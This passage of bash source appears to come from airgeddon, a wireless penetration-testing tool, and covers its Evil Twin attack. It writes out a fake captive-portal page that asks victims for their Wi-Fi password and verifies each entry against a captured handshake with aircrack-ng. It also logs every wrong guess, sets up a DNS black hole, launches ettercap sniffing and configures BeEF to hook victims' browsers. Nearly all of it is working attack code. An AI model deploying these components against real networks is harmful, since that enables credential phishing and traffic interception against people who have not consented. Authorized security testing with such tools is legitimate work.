				save_returning_vars_to_file
			fi

			exit 0
		fi
	EOF

	exec 7>&-
	sleep 1
}

#Create here-doc bash script used for control windows on Evil Twin attacks
function set_et_control_script() {

	debug_print

	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_et_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash
		et_heredoc_mode=${et_mode}
	EOF

	cat >&7 <<-'EOF'
		if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
			path_to_processes="${tmpdir}${webdir}${et_processesfile}"
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			function kill_et_windows() {

				readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
				for item in "${ET_PROCESSES_TO_KILL[@]}"; do
					kill "${item}" &> /dev/null
				done
			}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-EOF
			function finish_evil_twin() {

				echo "" > "${et_captive_portal_logpath}"
	EOF

	cat >&7 <<-'EOF'
				date +%Y-%m-%d >>\
	EOF

	cat >&7 <<-EOF
				"${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"
				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
	EOF

	cat >&7 <<-'EOF'
				echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> "${log_path}"
				attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
				et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
				echo -e "\t${et_password}"
				echo
				echo -e "\t${log_reminder_msg}"
				echo
				echo -e "\t${done_msg}"
				if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
	EOF

	cat >&7 <<-'EOF'
					for badpass in "${BADPASSWORDS[@]}"; do
						echo "${badpass}" >>\
	EOF

	cat >&7 <<-EOF
						"${et_captive_portal_logpath}"
					done
				fi

				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${et_captive_portal_logpath}"

				sleep 2
	EOF

	cat >&7 <<-'EOF'
				kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C dnsmasq --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
				kill_et_windows
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-EOF
				exit 0
			}
		fi
	EOF

	cat >&7 <<-'EOF'
		date_counter=$(date +%s)
		while true; do
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip2")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_sniffing_sslstrip2_beef")
			local control_msg=${et_misc_texts[${language},27]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			if [ "${channel}" != "${et_channel}" ]; then
				et_control_window_channel="${et_channel} (5Ghz: ${channel})"
			else
				et_control_window_channel="${channel}"
			fi
			echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
			echo -e "\t${hours}:${mins}:${secs}"
	EOF

	cat >&7 <<-EOF
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
	EOF

	cat >&7 <<-'EOF'
			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
	EOF

	cat >&7 <<-EOF
				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
					clear
					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
					echo
					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
	EOF

	cat >&7 <<-'EOF'
					echo -e "\t${hours}:${mins}:${secs}"
					echo
					finish_evil_twin
				else
					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
					tput el && echo -ne "\t${attempts_text} ${attempts_number}"
					if [ "${attempts_number}" -gt 0 ]; then
	EOF

	cat >&7 <<-EOF
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
	EOF

	cat >&7 <<-'EOF'
						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
					fi
				fi
				echo
				echo
			fi
	EOF

	cat >&7 <<-EOF
			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()
	EOF

	cat >&7 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
	EOF

	cat >&7 <<-EOF
				echo -e "\t${et_misc_texts[${language},7]}"
			else
	EOF

	cat >&7 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "${client_hostname}" ]]; then
							echo -e "\t${client_ip} ${client_mac}"
						else
							echo -e "\t${client_ip} ${client_mac} ${client_hostname}"
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			echo -ne "\033[K\033[u"
			sleep 0.3
			current_window_size="$(tput cols)x$(tput lines)"
			if [ "${current_window_size}" != "${stored_window_size}" ]; then
				stored_window_size="${current_window_size}"
				clear
			fi
		done
	EOF

	exec 7>&-
	sleep 1
}

#Launch dnsmasq dns black hole for captive portal Evil Twin attack
function launch_dns_blackhole() {

	debug_print

	recalculate_windows_sizes

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1

	{
	echo -e "interface=${interface}"
	echo -e "address=/#/${et_ip_router}"
	echo -e "address=/google.com/172.217.5.238"
	echo -e "address=/gstatic.com/172.217.5.238"
	echo -e "no-dhcp-interface=${interface}"
	echo -e "log-queries"
	echo -e "no-daemon"
	echo -e "no-resolv"
	echo -e "no-hosts"
	} >> "${tmpdir}${dnsmasq_file}"

	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Launch control window for Enterprise attacks
function launch_enterprise_control_window() {

	debug_print

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Control\"" "bash \"${tmpdir}${control_enterprise_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		enterprise_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_enterprise_file}\""
		enterprise_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}

#Launch control window for Evil Twin attacks
function launch_et_control_window() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_captive_portal")
			control_scr_window_position=${g4_topright_window}
		;;
		"et_sniffing_sslstrip2")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_sniffing_sslstrip2_beef")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
		et_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}

#Create configuration file for lighttpd
function set_webserver_config() {

	debug_print

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_cgi\""
	echo -e ")\n"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"${indexfile}\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

#Create captive portal files. Cgi bash scripts, css and js file
function set_captive_portal_page() {

	debug_print

	{
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tbackground-color: #1b5e20;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tbackground-color: #43a047;"
	echo -e "\tpadding: 20px;"
	echo -e "\tmargin: 15px auto 0;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #ffffff;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: center;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-bottom: 5px;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e "#password:hover,"
	echo -e "#password:focus {"
	echo -e "\tbox-shadow: 0 0 10px #69f0ae;"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tfont-weight: bold;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "}\n"
	echo -e "@media screen (min-width: 1000px) {"
	echo -e "\t.content {"
	echo -e "\t\twidth: 50%;"
	echo -e "\t}"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	{
	echo -e "(function() {\n"
	echo -e "\tvar onLoad = function() {"
	echo -e "\t\tvar formElement = document.getElementById(\"loginform\");"
	echo -e "\t\tif (formElement != null) {"
	echo -e "\t\t\tvar password = document.getElementById(\"password\");"
	echo -e "\t\t\tvar showpass = function() {"
	echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type == \"text\" ? \"password\" : \"text\");"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").addEventListener(\"click\", showpass);"
	echo -e "\t\t\tdocument.getElementById(\"showpass\").checked = false;\n"
	echo -e "\t\t\tvar validatepass = function() {"
	echo -e "\t\t\t\tif (password.value.length < 8) {"
	echo -e "\t\t\t\t\talert(\"${et_misc_texts[${captive_portal_language},16]}\");"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t\telse {"
	echo -e "\t\t\t\t\tformElement.submit();"
	echo -e "\t\t\t\t}"
	echo -e "\t\t\t}"
	echo -e "\t\t\tdocument.getElementById(\"formbutton\").addEventListener(\"click\", validatepass);"
	echo -e "\t\t}"
	echo -e "\t};\n"
	echo -e "\tdocument.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);"
	echo -e "})();\n"
	echo -e "function redirect() {"
	echo -e "\tdocument.location = \"${indexfile}\";"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${jsfile}"

	{
	echo -e "#!/usr/bin/env bash"
	echo -e "echo '<!DOCTYPE html>'"
	echo -e "echo '<html>'"
	echo -e "echo -e '\t<head>'"
	echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
	echo -e "echo -e '\t</head>'"
	echo -e "echo -e '\t<body>'"
	echo -e "echo -e '\t\t<div class=\"content\">'"
	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
	echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
	echo -e "echo -e '\t\t\t\t</div>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
	echo -e "echo -e '\t\t\t\t<label>'"
	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\"/><br/>'"
	echo -e "echo -e '\t\t\t\t</label>'"
	echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
	echo -e "echo -e '\t\t\t\t<input class=\"button\" id=\"formbutton\" type=\"button\" value=\"${et_misc_texts[${captive_portal_language},13]}\"/>'"
	echo -e "echo -e '\t\t\t</form>'"
	echo -e "echo -e '\t\t</div>'"
	echo -e "echo -e '\t</body>'"
	echo -e "echo '</html>'"
	echo -e "exit 0"
	} >> "${tmpdir}${webdir}${indexfile}"

	exec 4>"${tmpdir}${webdir}${checkfile}"

	cat >&4 <<-EOF
		#!/usr/bin/env bash
		echo '<!DOCTYPE html>'
		echo '<html>'
		echo -e '\t<head>'
		echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
		echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
		echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
		echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
		echo -e '\t</head>'
		echo -e '\t<body>'
		echo -e '\t\t<div class="content">'
		echo -e '\t\t\t<center><p>'
	EOF

	cat >&4 <<-'EOF'
		POST_DATA=$(cat /dev/stdin)
		if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
			POST_DATA=${POST_DATA#*=}
			password=${POST_DATA/+/ }
			password=${password//[*&\/?<>]}
			password=$(printf '%b' "${password//%/\\x}")
			password=${password//[*&\/?<>]}
		fi

		if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
	EOF

	cat >&4 <<-EOF
			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
	EOF

	cat >&4 <<-'EOF'
			echo "${password}" >\
	EOF

	cat >&4 <<-EOF
			"${tmpdir}${webdir}${currentpassfile}"
			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
	EOF

	cat >&4 <<-'EOF'
			if [ "$?" = "0" ]; then
	EOF

	cat >&4 <<-EOF
				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
				echo '${et_misc_texts[${captive_portal_language},18]}'
				et_successful=1
			else
	EOF

	cat >&4 <<-'EOF'
				echo "${password}" >>\
	EOF

	cat >&4 <<-EOF
				"${tmpdir}${webdir}${attemptsfile}"
				echo '${et_misc_texts[${captive_portal_language},17]}'
				et_successful=0
			fi
	EOF

	cat >&4 <<-'EOF'
		elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
	EOF

	cat >&4 <<-EOF
			echo '${et_misc_texts[${captive_portal_language},26]}'
			et_successful=0
		else
			echo '${et_misc_texts[${captive_portal_language},14]}'
			et_successful=0
		fi
		echo -e '\t\t\t</p></center>'
		echo -e '\t\t</div>'
		echo -e '\t</body>'
		echo '</html>'
	EOF

	cat >&4 <<-'EOF'
		if [ ${et_successful} -eq 1 ]; then
			exit 0
		else
			echo '<script type="text/javascript">'
			echo -e '\tsetTimeout("redirect()", 3500);'
			echo '</script>'
			exit 1
		fi
	EOF

	exec 4>&-
	sleep 3
}

#Launch lighttpd webserver for captive portal Evil Twin attack
function launch_webserver() {

	debug_print

	kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
	recalculate_windows_sizes
	lighttpd_window_position=${g4_bottomright_window}
	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "lighttpd -D -f \"${tmpdir}${webserver_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Launch ettercap sniffer
function launch_ettercap_sniffing() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing")
			sniffing_scr_window_position=${g3_bottomright_window}
		;;
	esac
	ettercap_cmd="ettercap -i ${interface} -q -T -z -S -u"
	if [ ${ettercap_log} -eq 1 ]; then
		ettercap_cmd+=" -l \"${tmp_ettercaplog}\""
	fi

	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer\"" "${ettercap_cmd}" "Sniffer"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${ettercap_cmd}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Create configuration file for beef
function set_beef_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1

	beef_db_path=""
	if [ -d "${beef_path}db" ]; then
		beef_db_path="db/${beef_db}"
	else
		beef_db_path="${beef_db}"
	fi

	local permitted_ui_subnet
	local permitted_ui_ipv6
	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_fixed_beef_iptables_issue}"; then
		permitted_ui_subnet="${loopback_ip}/${ip_mask_cidr}"
		permitted_ui_ipv6="${loopback_ipv6}"
	else
		permitted_ui_subnet="${any_ip}/${any_mask_cidr}"
		permitted_ui_ipv6="${any_ipv6}"
	fi

	local permitted_hooking_subnet
	local beef_panel_restriction
	if compare_floats_greater_or_equal "${beef_version}" "${beef_needed_brackets_version}"; then
		permitted_hooking_subnet="        permitted_hooking_subnet: [\"${et_ip_range}/${std_c_mask_cidr}\", \"${any_ipv6}\"]"
		beef_panel_restriction="        permitted_ui_subnet: [\"${permitted_ui_subnet}\", \"${permitted_ui_ipv6}\"]"
	else
		permitted_hooking_subnet="        permitted_hooking_subnet: \"${et_ip_range}/${std_c_mask_cidr}\""
		beef_panel_restriction="        permitted_ui_subnet: \"${permitted_ui_subnet}\""
	fi

	{
	echo -e "beef:"
	echo -e "    version: 'airgeddon integrated'"
	echo -e "    debug: false"
	echo -e "    client_debug: false"
	echo -e "    crypto_default_value_length: 80"
	echo -e "    restrictions:"
	echo -e "${permitted_hooking_subnet}"
	echo -e "${beef_panel_restriction}"
	echo -e "    http:"
	echo -e "        debug: false"
	echo -e "        host: \"${any_ip}\""
	echo -e "        port: \"${beef_port}\""
	echo -e "        dns_host: \"localhost\""
	echo -e "        dns_port: 53"
	echo -e "        web_ui_basepath: \"/ui\""
	echo -e "        hook_file: \"/${jshookfile}\""
	echo -e "        hook_session_name: \"BEEFHOOK\""
	echo -e "        session_cookie_name: \"BEEFSESSION\""
	echo -e "        web_server_imitation:"
	echo -e "            enable: true"
	echo -e "            type: \"apache\""
	echo -e "            hook_404: false"
	echo -e "            hook_root: false"
	echo -e "    database:"
	echo -e "        driver: \"sqlite\""
	echo -e "        file: \"${beef_db_path}\""
	echo -e "        db_file: \"${beef_db_path}\""
	echo -e "    credentials:"
	echo -e "        user: \"beef\""
	echo -e "        passwd: \"${beef_pass}\""
	echo -e "    autorun:"
	echo -e "        enable: true"
	echo -e "        result_poll_interval: 300"
	echo -e "        result_poll_timeout: 5000"
	echo -e "        continue_after_timeout: true"
	echo -e "    dns_hostname_lookup: false"
	echo -e "    integration:"
	echo -e "        phishing_frenzy:"
	echo -e "            enable: false"
	echo -e "    extension:"
	echo -e "        requester:"
	echo -e "            enable: true"
	echo -e "        proxy:"
	echo -e "            enable: true"
	echo -e "            key: \"beef_key.pem\""
	echo -e "            cert: \"beef_cert.pem\""
	echo -e "        metasploit:"
	echo -e "            enable: false"
	echo -e "        social_engineering:"
	echo -e "            enable: true"
	echo -e "        evasion:"
	echo -e "            enable: false"
	echo -e "        console:"
	echo -e "            shell:"
	echo -e "                enable: false"
	echo -e "        ipec:"
	echo -e "            enable: true"
	echo -e "        dns:"
	echo -e "            enable: false"
	echo -e "        dns_rebinding:"
	echo -e "            enable: false"
	echo -e "        admin_ui:"
	echo -e "            enable: true"
	echo -e "            base_path: \"/ui\""
	} >> "${tmpdir}${beef_file}"
}

#Kill beef process
#shellcheck disable=SC2009
function kill_beef() {

	debug_print

	local beef_pid
	beef_pid="$(ps -C "${optional_tools_names[17]}" --no-headers -o pid | tr -d ' ')"
	if ! kill "${beef_pid}" &> /dev/null; then
		if ! kill "$(ps -C "beef" --no-headers -o pid | tr -d ' ')" &> /dev/null; then
			kill "$(ps -C "ruby" --no-headers -o pid,cmd | grep "beef" | awk '{print $1}')" &> /dev/null
		fi
	fi
}

#Detects if your beef is Flexible Brainfuck interpreter instead of BeEF
function detect_fake_beef() {

	debug_print

	readarray -t BEEF_OUTPUT < <(timeout -s SIGTERM 0.5 beef -h 2> /dev/null)

	for item in "${BEEF_OUTPUT[@]}"; do
		if [[ ${item} =~ Brainfuck ]]; then
			fake_beef_found=1
			break
		fi
	done
}

#Search for beef path
function search_for_beef() {

	debug_print

	if [ "${beef_found}" -eq 0 ]; then
		for item in "${possible_beef_known_locations[@]}"; do
			if [ -f "${item}beef" ]; then
				beef_path="${item}"
				beef_found=1
				break
			fi
		done
	fi
}

#Prepare system to work with beef
function prepare_beef_start() {

	debug_print

	valid_possible_beef_path=0
	if [[ ${beef_found} -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 191 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
		fi

		if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
			fix_beef_executable "${manually_entered_beef_path}"
		fi

		if [ ${beef_found} -eq 1 ]; then
			echo
			language_strings "${language}" 413 "yellow"
			language_strings "${language}" 115 "read"
		fi
	elif [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 0 ]]; then
		fix_beef_executable "${beef_path}"
		echo
		language_strings "${language}" 413 "yellow"
		language_strings "${language}" 115 "read"
	elif [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
		language_strings "${language}" 405 "blue"
		ask_yesno 415 "yes"
		if [ "${yesno}" = "y" ]; then
			manual_beef_set
			search_for_beef
			if [[ ${beef_found} -eq 1 ]] && [[ ${valid_possible_beef_path} -eq 1 ]]; then
				rewrite_script_with_custom_beef "set" "${manually_entered_beef_path}"
				echo
				language_strings "${language}" 413 "yellow"
				language_strings "${language}" 115 "read"
			fi
		fi
	fi
}

#Set beef path manually
function manual_beef_set() {

	debug_print

	while [[ "${valid_possible_beef_path}" != "1" ]]; do
		echo
		language_strings "${language}" 402 "green"
		echo -en '> '
		manually_entered_beef_path=$(read -re _manually_entered_beef_path; echo -n "${_manually_entered_beef_path}")
		manually_entered_beef_path=$(fix_autocomplete_chars "${manually_entered_beef_path}")
		if [ -n "${manually_entered_beef_path}" ]; then
			lastcharmanually_entered_beef_path=${manually_entered_beef_path: -1}
			if [ "${lastcharmanually_entered_beef_path}" != "/" ]; then
				manually_entered_beef_path="${manually_entered_beef_path}/"
			fi

			firstcharmanually_entered_beef_path=${manually_entered_beef_path:0:1}
			if [ "${firstcharmanually_entered_beef_path}" != "/" ]; then
				language_strings "${language}" 404 "red"
			else
				if [ -d "${manually_entered_beef_path}" ]; then
					if [ -f "${manually_entered_beef_path}beef" ]; then
						if head "${manually_entered_beef_path}beef" -n 1 2> /dev/null | grep ruby > /dev/null; then
							possible_beef_known_locations+=("${manually_entered_beef_path}")
							valid_possible_beef_path=1
						else
							language_strings "${language}" 406 "red"
						fi
					else
						language_strings "${language}" 406 "red"
					fi
				else
					language_strings "${language}" 403 "red"
				fi
			fi
		fi
	done
}

#Fix for not found beef executable
function fix_beef_executable() {

	debug_print

	rm -rf "/usr/bin/beef" > /dev/null 2>&1
	{
	echo -e "#!/usr/bin/env bash\n"
	echo -e "cd ${1}"
	echo -e "./beef"
	} >> "/usr/bin/beef"
	chmod +x "/usr/bin/beef" > /dev/null 2>&1
	optional_tools[${optional_tools_names[17]}]=1

	rewrite_script_with_custom_beef "set" "${1}"
}

#Rewrite airgeddon script in a polymorphic way adding custom beef location to array to get persistence
function rewrite_script_with_custom_beef() {

	debug_print

	case ${1} in
		"set")
			sed -ri "s:(\s+|\t+)([\"0-9a-zA-Z/\-_ ]+)?\s?(#Custom BeEF location \(set=)([01])(\)):\1\"${2}\" \31\5:" "${scriptfolder}${scriptname}" 2> /dev/null
		;;
		"search")
			beef_custom_path_line=$(grep "#[C]ustom BeEF location (set=1)" < "${scriptfolder}${scriptname}" 2> /dev/null)
			if [ -n "${beef_custom_path_line}" ]; then
				[[ ${beef_custom_path_line} =~ \"(.*)\" ]] && beef_custom_path="${BASH_REMATCH[1]}"
			fi
		;;
	esac
}

#Start beef process as a service
function start_beef_service() {

	debug_print

	if ! service "${optional_tools_names[17]}" restart > /dev/null 2>&1; then
		systemctl restart "${optional_tools_names[17]}.service" > /dev/null 2>&1
	fi
}

#Launch beef browser exploitation framework
#shellcheck disable=SC2164
function launch_beef() {

	debug_print

	kill_beef

	if [ "${beef_found}" -eq 0 ]; then
		start_beef_service
	fi

	recalculate_windows_sizes
	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
